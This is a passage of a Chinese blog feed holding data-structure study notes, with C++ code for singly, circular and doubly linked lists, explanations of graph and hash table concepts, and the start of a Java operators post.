class="hljs-function">Status <span class="hljs-title">DestoryList</span><span class="hljs-params">(LinkList &amp;L)</span></span>&#123;  <span class="hljs-comment">//销毁单链表L</span><br>    LNode *p;   <span class="hljs-comment">//或者LinkList p</span><br>    <span class="hljs-keyword">while</span>(L)&#123;<br>        p = L;  <span class="hljs-comment">//从头结点开始</span><br>        L = L -&gt; next;  <span class="hljs-comment">//让一个指针指向下一个结点，L -&gt; next的值就是下一个结点的地址</span><br>        <span class="hljs-keyword">delete</span> p; <br>        <span class="hljs-comment">//c++：L = new LNode，delete p</span><br>        <span class="hljs-comment">//c：L = (LinkList)malloc(sizeof(LNode))，free(p)</span><br>     <br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//清空单链表</span><br><span class="hljs-function">Status <span class="hljs-title">ClearList</span><span class="hljs-params">(LinkList &amp;L)</span></span>&#123;  <span class="hljs-comment">//将L重置为空表</span><br>    LNode *p,*q;   <span class="hljs-comment">//或者LinkList p,q;</span><br>    p = L -&gt;next;  <span class="hljs-comment">//p指向第一个结点</span><br>    <span class="hljs-keyword">while</span>(p)&#123;<br>        q = p -&gt; next;<br>        <span class="hljs-keyword">delete</span> p;<br>        p = q;<br>        <br>    &#125;<br>    L -&gt; next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//求链表的表长</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">ListLength</span><span class="hljs-params">(LinkList L)</span></span>&#123;   <span class="hljs-comment">//返回L中数据元素的个数</span><br>    <span class="hljs-comment">//会对表的内容改变用&amp;L，不改变就用L</span><br>    LNode *p;   <span class="hljs-comment">//或者LinkList p</span><br>    p = L -&gt; next;  <span class="hljs-comment">//p指向第一个结点</span><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>   <span class="hljs-keyword">while</span>(p)&#123;<br>        i ++;<br>        p = p -&gt; next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> i;<br>&#125;<br><br><br><br><span class="hljs-comment">//获取单链表某一位置上的元素</span><br><span class="hljs-function">Status <span class="hljs-title">GetElem</span><span class="hljs-params">(LinkList L,<span class="hljs-type">int</span> i,ElemType &amp;e)</span></span>&#123;<br>    <span class="hljs-type">int</span> j;<br>    LNode *p;<br>    p = L-&gt;next;  <span class="hljs-comment">//让p指向链表L的第一个结点</span><br>    j = <span class="hljs-number">1</span>;   <span class="hljs-comment">//j为计数器</span><br>    <span class="hljs-keyword">while</span>(p &amp;&amp; j&lt;i)&#123;    <span class="hljs-comment">//向后扫描，直到p指向第i个元素或p为空</span><br>        p = p-&gt;next;<br>        ++j;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!p || j&gt;i) <span class="hljs-keyword">return</span> ERROR;   <span class="hljs-comment">//第i个元素不存在</span><br>    e = p -&gt; data;  <span class="hljs-comment">//第i个元素的数据</span><br>    <span class="hljs-keyword">return</span> OK;<br>    <br>&#125;<br><br><span class="hljs-comment">//单链表的按值查找</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">LocateElem</span><span class="hljs-params">(LinkList L, <span class="hljs-type">int</span> e)</span></span>&#123;<br>    LinkList p = L-&gt;next;<br>    <span class="hljs-type">int</span> j = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (p &amp;&amp; p-&gt;data != e) &#123;<br>p = p-&gt;next;<br>        j++;<br>&#125;<br>    <span class="hljs-keyword">if</span> (p) <span class="hljs-keyword">return</span> j; <br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><br><span class="hljs-comment">//单链表的插入</span><br><span class="hljs-function">Status <span class="hljs-title">ListInsert</span><span class="hljs-params">(LinkList &amp;L,<span class="hljs-type">int</span> i,ElemType e)</span></span>&#123;<br>    <span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;<br>    LNode *p,*s;<br>    p=L;<br>    <span class="hljs-keyword">while</span> (p &amp;&amp; j&lt; i<span class="hljs-number">-1</span>)&#123;  <span class="hljs-comment">//寻找第i-1个结点</span><br>        p = p -&gt; next;<br>        j++;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!p || j &gt; i<span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span> ERROR;<br>    s = <span class="hljs-keyword">new</span> LNode;<br>    s -&gt; data = e;<br>    s-&gt;next = p-&gt;next;<br>    p-&gt;next=s;<br>    <span class="hljs-keyword">return</span> OK;<br>        <br>&#125;<br><br><br><span class="hljs-comment">//单链表的删除</span><br><span class="hljs-function">Status <span class="hljs-title">ListDelete</span><span class="hljs-params">(LinkList &amp;L, <span class="hljs-type">int</span> i, ElemType &amp;e)</span></span>&#123;<br>    <span class="hljs-type">int</span> j;<br>    LNode *p,*q;<br>    p = L;<br>    j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(p-&gt;next &amp;&amp; j&lt;i<span class="hljs-number">-1</span>)&#123; <span class="hljs-comment">//遍历寻找第i-1个元素</span><br>        p = p-&gt;next;<br>        ++j;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(p-&gt;next) || j&gt;i<span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span> ERROR; <span class="hljs-comment">//第i个元素不存在</span><br>    q = p-&gt;next;   <span class="hljs-comment">//临时保存被删结点的地址以备释放</span><br>    p-&gt;next = q-&gt;next; <span class="hljs-comment">//q的后继赋值给p的后继</span><br>    e = q-&gt;data;  <span class="hljs-comment">//将q结点中的数据给e</span><br>    <span class="hljs-keyword">delete</span> q;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> empty;<br>    <span class="hljs-type">int</span> length;<br>    <span class="hljs-type">int</span> m; <span class="hljs-comment">//存储从单链表中获取的某一位置上的元素</span><br>    <span class="hljs-type">int</span> n; <span class="hljs-comment">//存储某一元素在单链表中的位置</span><br>    <span class="hljs-type">int</span> a; <span class="hljs-comment">//删除操作中删除的那个元素的值</span><br><br>    LinkList L;<br>    <span class="hljs-comment">//构造单链表</span><br>    <span class="hljs-built_in">InitList</span>(L);<br>    <span class="hljs-built_in">OutPut</span>(L);<br>    empty = <span class="hljs-built_in">isEmpty</span>(L);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;判断是否为空(1空0非空)：%d&quot;</span>,empty);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n------头插法5个数------\n&quot;</span>);<br>    <span class="hljs-built_in">CreateList_L</span>(L,<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">OutPut</span>(L);  <br>    empty = <span class="hljs-built_in">isEmpty</span>(L);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;判断是否为空(1空0非空)：%d&quot;</span>,empty);<br><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n------清空单链表------\n&quot;</span>);<br>    <span class="hljs-built_in">ClearList</span>(L);<br>    <span class="hljs-built_in">OutPut</span>(L);<br>    empty = <span class="hljs-built_in">isEmpty</span>(L);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;判断是否为空(1空0非空)：%d&quot;</span>,empty);<br><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n------尾插法6个数------\n&quot;</span>);<br>    <span class="hljs-built_in">CreateList_R</span>(L,<span class="hljs-number">6</span>);<br>    <span class="hljs-built_in">OutPut</span>(L);<br>    length = <span class="hljs-built_in">ListLength</span>(L);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;链表的长度为：%d&quot;</span>,length);<br><br>    <span class="hljs-comment">// printf(&quot;------销毁单链表------\n&quot;);</span><br>    <span class="hljs-comment">// DestoryList(L);</span><br>    <span class="hljs-comment">// OutPut(L);</span><br><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n----用尾插法，在前面插入的基础上再插入3个数----\n&quot;</span>);<br>    <span class="hljs-built_in">CreateList_R2</span>(L,<span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">OutPut</span>(L);<br>    length = <span class="hljs-built_in">ListLength</span>(L);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;链表的长度为：%d&quot;</span>,length);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n------获取单链表某一位置上的元素------\n&quot;</span>);<br>    <span class="hljs-built_in">GetElem</span>(L,<span class="hljs-number">3</span>,m);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第三个元素的值为：%d&quot;</span>,m);<br><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n------获取某一元素在单链表中的位置------\n&quot;</span>);<br>    n = <span class="hljs-built_in">LocateElem</span>(L,<span class="hljs-number">88</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;88的位置为：%d&quot;</span>,n);<br><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n------单链表的插入------\n&quot;</span>);<br>    <span class="hljs-built_in">ListInsert</span>(L,<span class="hljs-number">3</span>,<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">OutPut</span>(L);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n------单链表的删除------\n&quot;</span>);<br>    <span class="hljs-built_in">ListDelete</span>(L,<span class="hljs-number">1</span>,a);<br>    <span class="hljs-built_in">OutPut</span>(L);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除的第一个位置上的元素为：%d&quot;</span>,a);<br>&#125;<br><span class="hljs-comment">//虽然什么都没干，但还是忙死我了😎</span><br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311301926438.png"alt="单链表的所有操作总结" /><figcaption aria-hidden="true">单链表的所有操作总结</figcaption></figure><h2 id="循环链表">2.8 循环链表</h2><p>循环链表是头尾相接的链表(即表中最后一个结点的指针域指向头结点，整个链表形成一个环(circularlinked list)</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311301931444.png"alt="循环链表" /><figcaption aria-hidden="true">循环链表</figcaption></figure><p>优点：从表中任一结点出发均可访问全部结点</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311301932054.png"alt="image-20231130193234977" /><figcaption aria-hidden="true">image-20231130193234977</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311301932891.png"alt="image-20231130193247819" /><figcaption aria-hidden="true">image-20231130193247819</figcaption></figure><p>如果我们经常要操作首尾结点，用尾指针更方便</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311301935244.png"alt="image-20231130193518153" /><figcaption aria-hidden="true">image-20231130193518153</figcaption></figure><p>带尾指针循环链表的合并(将Tb合并在Ta之后)</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311301940915.png"alt="image-20231130194030814" /><figcaption aria-hidden="true">image-20231130194030814</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">LinkList <span class="hljs-title">Connect</span><span class="hljs-params">(LinkList Ta, LinkList Tb)</span></span>&#123;<br>    LNode *ptr;<br>    <br>    p = Ta-&gt;next;    <span class="hljs-comment">//p保存 Ta 的头结点</span><br>    Ta-&gt;next = Tb-&gt;next-&gt;next;    <span class="hljs-comment">//Tb表头链接Ta表尾</span><br>    <span class="hljs-keyword">delete</span> Tb-&gt;next;    <span class="hljs-comment">//释放 Tb 的头结点</span><br>    Tb-&gt;next = p;    <span class="hljs-comment">//修改 Tb 尾结点的后继为 Ta 的头结点</span><br><br>    <span class="hljs-keyword">return</span> Tb;    <span class="hljs-comment">//返回合并后的头结点</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="双向链表">2.9 双向链表</h2><h3 id="双向链表-1">2.9.1 双向链表</h3><p>单链表的结点<code>---&gt;</code>有指示后继的指针域<code>---&gt;</code>找后继结点方便；</p><p>即：查找某结点的后继结点的执行时间为 O(1)</p><p><code>---&gt;</code>无指示前驱的指针域<code>---&gt;</code>找前驱结点难:从表头出发查找</p><p>即：查找某结点的前驱结点的执行时间为 O(n)</p><p>为了克服单链表的这一缺点，设计了双向链表(double linked list)，</p><p>双向链表是在单链表的每个结点中再设计一个指向其前驱结点的指针域。所以在双向链表中的结点有两个指针域，一个指向直接后继，另一个指向直接前驱。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311301952903.png"alt="双向链表结点结构" /><figcaption aria-hidden="true">双向链表结点结构</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//双向链表的存储结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">DuLNode</span>&#123;<br>    ElemType data;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">DuLNode</span> *prior;    <span class="hljs-comment">//前驱指针域</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">DuLNode</span> *next;    <span class="hljs-comment">//后继指针域</span><br>&#125;DuLNode,*DuLinkList;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311301952720.png"alt="双向链表的存储结构" /><figcaption aria-hidden="true">双向链表的存储结构</figcaption></figure><h3 id="双向循环链表">2.9.2 双向循环链表</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311301954974.png"alt="image-20231130195409888" /><figcaption aria-hidden="true">image-20231130195409888</figcaption></figure><p>双向链表结构有对称性(设指针p指向某一个结点)<code>p-&gt;prior-&gt;next = p = p-&gt;next-&gt;prior</code>(前进一步后退一步相当于原地踏步)</p><p>在双向链表中有些操作(ListLength，GetElemment)等因为只涉及一个方向的指针，他们的算法与线性表的相同。</p><p>但在插入和删除需要修改两个方向上的指针，两者的算法复杂度均为O(n)</p><h3 id="双向链表的插入">2.9.3 双向链表的插入</h3><p>其实双向链表的结构是下面这样的：</p><p>上面的那种经典教程中的经典结构我个人认为有点有失偏颇，会在一定程度上误导我这种笨学生</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311302013225.png"alt="双向链表的结构" /><figcaption aria-hidden="true">双向链表的结构</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311302015995.png"alt="双向链表的插入" /><figcaption aria-hidden="true">双向链表的插入</figcaption></figure><p>同时这里王卓老师讲的双向链表的插入可以用上面那种结构自己画一下示意图，会更好的理解</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//或者void ListInsert_DuL(DuLinkList &amp;L,int i,ElemType e)&#123;&#125;</span><br><span class="hljs-function">Status <span class="hljs-title">ListInsert_DuL</span><span class="hljs-params">(DuLinkList &amp;L,<span class="hljs-type">int</span> i,ElemType e)</span></span>&#123;<br><span class="hljs-comment">//在带头结点的双向链表中第i个位置之前插入元素 e</span><br>    <span class="hljs-keyword">if</span>(!(p=<span class="hljs-built_in">GetElem_DuL</span>(L,i))) <span class="hljs-keyword">return</span> ERROR;  <span class="hljs-comment">//在L中确定第 i个元素的位置指针 p，p为 NULL时，第i个元素不存在</span><br>    s = <span class="hljs-keyword">new</span> DuLNode;  <span class="hljs-comment">//生成新结点*s</span><br>    s-&gt;data=e;   <span class="hljs-comment">//将结点*s 数据域置为 e</span><br>    s-&gt;prior = p-&gt;prior;   <span class="hljs-comment">//将结点*s 插人L中，对应上图中①</span><br>    p-&gt;prior-&gt;next = s;  <span class="hljs-comment">//对应上图中②</span><br>    s-&gt;next = p;   <span class="hljs-comment">//对应上图中③</span><br>    p-&gt;prior = s;   <span class="hljs-comment">//对应上图中④</span><br>   <br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="双向链表的删除">2.9.4 双向链表的删除</h3><p>假设要删除双向链表的结点 ptr，只需要把 ptr结点的前驱和后继安排明白即可。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311302023648.png"alt="双向链表的删除" /><figcaption aria-hidden="true">双向链表的删除</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ListDelete_DuL</span><span class="hljs-params">(DuLink &amp;L, <span class="hljs-type">int</span> i, ElemType &amp;e)</span> </span>&#123;<br>    <span class="hljs-comment">// 删除带头结点的双向循环链表 L 的第 i个元素，并用 e 返回</span><br>    <span class="hljs-keyword">if</span>(!(p=<span class="hljs-built_in">GetElem_DuL</span>(L,i))) <span class="hljs-keyword">return</span> ERROR;<br>    e = p -&gt; data;<br>p -&gt; prior -&gt; next = p -&gt; next;<br>    p -&gt; next -&gt; prior = p -&gt; prior;<br>    <span class="hljs-built_in">free</span>(p);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="顺序表和链表的比较">2.10 顺序表和链表的比较</h2><p>链式存储结构的优点：</p><ul><li>结点空间可以动态申请和释放；</li><li>数据元素的逻辑次序靠结点的指针来指示，插入和删除不需要移动元素。</li></ul><p>链式存储结构的缺点：</p><ul><li>存储密度小，每个结点的指针域需额外占用存储空间。当每个结点的数据域所占的字节数不多时，指针域所占的存储空间的比重显得很大。存储密度是指结点数据本身占用的空间/结点占用的空间总量</li><li>链式存储结构是非随机存取结构。对任一结点的操作都要从头指针依指针链查找到该结点，这增加了算法的复杂度。(对某个结点操作一般要先找到该结点)</li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311302125275.png"alt="存储密度的概念" /><figcaption aria-hidden="true">存储密度的概念</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311302125600.png"alt="存储密度的例子" /><figcaption aria-hidden="true">存储密度的例子</figcaption></figure><p>顺序表和链表的比较</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311302127947.png"alt="顺序表和链表的比较" /><figcaption aria-hidden="true">顺序表和链表的比较</figcaption></figure><h2 id="应用">*2.11 应用</h2><blockquote><p>ptr -- pointer （即指针）的缩写。</p><p>参考资料：</p><p><ahref="https://www.cnblogs.com/linfangnan/p/12316614.html">数据结构：链表结构和例题详解- 乌漆WhiteMoon - 博客园 (cnblogs.com)</a></p><p><ahref="https://www.zhihu.com/tardis/zm/art/421431276?source_id=1005">LinkListL、LinkList&amp; L、和LinkList *L这三者的区别 (zhihu.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/529817686">关于linklist L和linklist &amp;L的区别 - 知乎 (zhihu.com)</a></p><p><ahref="https://www.bilibili.com/read/readlist/rl241105?share_medium=android&amp;share_plat=android&amp;share_source=COPY&amp;share_tag=s_i&amp;timestamp=1615722826&amp;unique_k=376Uh5">数据结构-文集 哔哩哔哩专栏 (bilibili.com)</a></p><p><ahref="https://blog.csdn.net/Real_Fool_/article/details/113463997?ops_request_misc=%7B%22request%5Fid%22%3A%22169897557216800211564576%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=169897557216800211564576&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-113463997-null-null.142%5Ev96%5Epc_search_result_base1&amp;utm_term=线性表&amp;spm=1018.2226.3001.4187">数据结构：线性表(List)【详解】-CSDN博客</a></p><p><ahref="http://data.biancheng.net/view/161.html">链表的基本操作（C语言）详解(biancheng.net)</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构 图</title>
    <link href="/2023/11/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%20%E5%9B%BE/"/>
    <url>/2023/11/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%20%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<blockquote><p>图结构常用来存储逻辑关系为“多对多”的数据。比如说，一个学生可以同时选择多门课程，而一门课程可以同时被多名学生选择，学生和课程之间的逻辑关系就是“多对多”。</p></blockquote><h2 id="图的基本概念">图的基本概念</h2><h3 id="弧头和弧尾">1、弧头和弧尾</h3><p>有向图中，无箭头一端的顶点通常被称为"初始点"或"弧尾"，箭头一端的顶点被称为"终端点"或"弧头"。</p><h3 id="入度和出度">2、入度和出度</h3><p>对于有向图中的一个顶点 V 来说，箭头指向 V 的弧的数量为 V的入度（InDegree，记为 ID(V)）；箭头远离 V 的弧的数量为 V的出度（OutDegree，记为OD(V)）。</p><h3 id="v1v2-和-v1v2-的区别">3、(V1,V2) 和 &lt;V1,V2&gt; 的区别</h3><p>无向图中描述两顶点 V1 和 V2 之间的关系可以用 <code>(V1, V2)</code>来表示；有向图中描述从 V1 到 V2 的"单向"关系可以用<code>&lt;V1,V2&gt;</code> 来表示。</p><p>由于图存储结构中顶点之间的关系是用线来表示的，因此 (V1,V2)还可以用来表示无向图中连接 V1 和 V2 的线，又称为边；同样，&lt;V1,V2&gt;也可用来表示有向图中从 V1 到 V2 带方向的线，又称为弧。</p><h3 id="集合-vr">4、集合 VR</h3><p>图中习惯用 VR表示图中所有顶点之间关系的集合。例如，下图中有向图的集合<code>VR=&#123;&lt;v1,v2&gt;,&lt;v1,v3&gt;,&lt;v3,v4&gt;,&lt;v4,v1&gt;&#125;</code>。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311101725825.png"alt="image-20231110172523787" /><figcaption aria-hidden="true">image-20231110172523787</figcaption></figure><h3 id="路径和回路">5、路径和回路</h3><p>无论是无向图还是有向图，从一个顶点到另一顶点途经的所有顶点组成的序列（包含这两个顶点），称为一条<strong>路径</strong>。如果路径中第一个顶点和最后一个顶点相同，则此路径称为<strong>"回路"</strong>（或<strong>"环"</strong>）。</p><p>在此基础上，若路径中各顶点都不重复，此路径被称为"简单路径"；若回路中的顶点互不重复，此回路被称为"简单回路"（或简单环）。</p><p>拿上图来说，从 V1 存在一条路径还可以回到 V1，此路径为<code>&#123;V1,V3,V4,V1&#125;</code>，这是一个回路（环），而且还是一个简单回路（简单环）。</p><blockquote><p>在有向图中，每条路径或回路都是有方向的。</p></blockquote><h3 id="权和网">6、权和网</h3><p>有些场景中，可能会为图中的每条边赋予一个实数表示一定的含义，这种与边（或弧）相匹配的实数被称为"权"，而<strong>带权的图</strong>通常称为<strong>网</strong>。例如，下图就是一个网结构：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311101727237.png"alt="image-20231110172730210" /><figcaption aria-hidden="true">image-20231110172730210</figcaption></figure><h3 id="子图">7、子图</h3><p>指的是由图中一部分顶点和边构成的图，称为原图的子图。</p><h2 id="图存储结构的分类">图存储结构的分类</h2><p>根据不同的特征，图又可细分为完全图，连通图，稀疏图和稠密图：</p><ul><li><p>完全图：若图中各个顶点都与除自身外的其他顶点有直接关系，这样的无向图称为<strong>完全图</strong>（如图5a)）。同时，满足此条件的有向图则称为<strong>有向完全图</strong>（图5b)）。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311101728235.gif"alt="完全图示意图" /><figcaption aria-hidden="true">完全图示意图</figcaption></figure><blockquote><p>具有 n 个顶点的完全图，图中边的数量为 n(n-1)/2；而对于具有 n个顶点的有向完全图，图中弧的数量为 n(n-1)。</p></blockquote></li><li><p>稀疏图和稠密图：这两种图是相对存在的，即如果图中具有很少的边（或弧），此图就称为"稀疏图"；反之，则称此图为"稠密图"。</p><blockquote><p>稀疏和稠密的判断条件是：e&lt;nlogn，其中 e表示图中边（或弧）的数量，n表示图中顶点的数量。如果式子成立，则为稀疏图；反之为稠密图。</p></blockquote></li></ul><h2 id="连通图">连通图</h2>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构 查找</title>
    <link href="/2023/11/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%20%E6%9F%A5%E6%89%BE/"/>
    <url>/2023/11/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%20%E6%9F%A5%E6%89%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="哈希表">哈希表</h2><p>哈希表查找：通过关键字值进行某种运算，直接求出记录文件的地址，是关键字到地址的直接转换方法，不需反复比较。</p><p>两个问题：</p><ul><li>如何构造哈希（或散列）函数？</li><li>如何解决冲突？</li></ul><p>哈希函数是一个映像，使得： Addr(<spanclass="math inline">\(R_i\)</span>)=H(<spanclass="math inline">\(key_i\)</span>) 其中：</p><ul><li><span class="math inline">\(key_i\)</span>为记录<spanclass="math inline">\(R_i\)</span>的关键字；</li><li>H(<span class="math inline">\(key_i\)</span>)为哈希函数；</li><li>Addr(<span class="math inline">\(R_i\)</span>)为记录<spanclass="math inline">\(R_i\)</span>的存储地址</li><li>冲突：对不同的关键字可能得到同一哈希地址。</li></ul><h3 id="哈希函数的构造方法">哈希函数的构造方法</h3><p>目标：使关键字经过哈希函数得到一个“随机地址”，以便使一组关键字的哈希地址均匀分布在整个地址区间中，减少冲突。</p><h4 id="直接定址法">直接定址法</h4><p>H(key)=a.key+b 其中：a,b为常数</p><p>不同的关键字不会发生冲突，但在记录长度不等的情况下浪费一些存储空间。</p><h4 id="数字分析法">数字分析法</h4><p>假设有一组关键字，每个关键字由n位数字组成，如：k1k2…kn,从中提取数字分布比较均匀的若干位作为哈希地址。</p><p><strong>平方取中法</strong>：取关键字平方后的中间几位哈希地址例：</p>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>&lt;Java&gt; 3 运算符</title>
    <link href="/2023/11/08/Java%203%20%E8%BF%90%E7%AE%97%E7%AC%A6/"/>
    <url>/2023/11/08/Java%203%20%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
    
    <content type="html"><![CDATA[<blockquote><p>运算符：一种特殊的符号，用于表示数据的运算、赋值和比较等。</p></blockquote><h2 id="算数运算符">3.1 算数运算符</h2><blockquote><p>算术运算符是对数值类型的变量进行运算的运算符，在 Java程序中使用得非常多。其运算结果是一个数值量。</p></blockquote><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311081107099.png"alt="image-20231108110732994" /><figcaption aria-hidden="true">image-20231108110732994</figcaption></figure><ul><li><p><code>+</code> ; <code>-</code> ; <code>*</code> ; <code>/</code>：加（正）、减（负）、乘、除</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArithmeticOperator</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>System.out.println(<span class="hljs-number">10</span> / <span class="hljs-number">4</span>); <span class="hljs-comment">//从数学来看是 2.5, java 中 2</span><br>System.out.println(<span class="hljs-number">10.0</span> / <span class="hljs-number">4</span>); <span class="hljs-comment">//java 是 2.5</span><br><span class="hljs-type">double</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span> / <span class="hljs-number">4</span>;    <span class="hljs-comment">//java 中 10 / 4 = 2, 2=&gt;2.0</span><br>System.out.println(d);<span class="hljs-comment">// 是 2.0</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>%</code>：取模（求余数），结果和被取模数同号。本质是一个公式:<code>a % b == a - a / b * b;</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span 